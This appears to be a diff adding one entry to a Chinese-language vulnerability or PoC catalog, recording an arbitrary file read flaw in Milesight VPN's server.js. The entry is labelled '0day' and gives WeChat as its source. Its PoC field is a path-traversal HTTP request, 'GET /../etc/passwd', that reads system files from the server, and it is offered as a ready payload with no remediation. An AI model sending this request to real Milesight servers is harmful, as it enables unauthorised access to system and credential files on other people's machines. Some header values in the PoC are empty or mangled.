@@ -1,0 +1,8 @@
+vendor = "Milesight"
+name = "Milesight VPN server.js 任意文件读取漏洞"
+type = "任意文件读取"
+source = "微信"
+info = "/../etc/passwd MilesightVPN 是一款软件，一个 Milesight 产品的 VPN 通道设置过程更加完善，并可通过网络服务器界面连接状态。其中任意存在文件读取监控漏洞，攻击者通过漏洞可以获取服务器中敏感文件"
+date = "08.14"
+poc = "GET /../etc/passwd HTTP/1.1 Host: Accept: / Content-Type: application/x-www-form-urlencoded"
+label = "0day"
